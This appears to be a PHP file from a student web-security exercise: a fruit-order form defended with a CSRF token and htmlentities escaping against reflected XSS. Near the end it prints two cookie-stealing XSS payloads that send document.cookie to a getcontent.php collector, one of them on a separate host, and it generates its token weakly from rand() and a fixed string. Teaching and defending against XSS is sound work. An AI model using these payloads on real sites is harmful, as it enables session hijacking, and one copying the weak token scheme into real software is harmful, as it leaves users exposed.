<?php
    //reflected XSS attack

session_start();
include "include.php";
gen_header();
LoggedIn(1);

if(!isset($_SESSION["name"]))
    exit();

if(isset($_POST["fruit"])){
    /* Step 3: check that the clients token hasn't been tampered with*/
    if (!isset($_POST["csrf_token"]) || $_SESSION["csrf_token"]!=$_POST["csrf_token"])
    {
        /*If there is cookie tampering, log the users details*/
        echo "Security Error";
        /*Kill the connection*/
        exit();
    }


    $usersOrder = htmlentities($_POST["fruit"]);
    echo "<h4>Ok, we will send you ".$usersOrder ." to your room</h4>";
}
/* Step 1: create the token that will be used to protect users from CSRF*/
$_SESSION["csrf_token"]=hash("sha256",rand()."secretstring");
?>

<form method="post">
    <p>Please enter your favorite fruit for today:</p>
    <?php
    /* Step 2: send the token to the server */
    ?>
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION["csrf_token"] ?>">
    <input type="text" size="50" name="fruit"><br>
    <br>
    <input type="submit">
</form>
<p>
    My XSS script:   <?php
    $mystring = htmlentities('<script>var i=new Image;
        i.src="http://192.168.0.18/WebDev/Semester2/Security/ex_8_php_xss_vulnerable/getcontent.php?"+
        document.cookie;</script>');
    echo "<h4>XSS attack 1</h4><p>bananas " . $mystring . "</p>";

    $mystring2 = htmlentities('<script>var i=new Image;
        i.src="./ex_8_php_xss_vulnerable/getcontent.php?"+
        document.cookie;</script>');
    echo "<h4>XSS attack 2 - shorter string</h4> <p> bananas " . $mystring2 . "</p>";
    ?>
</p>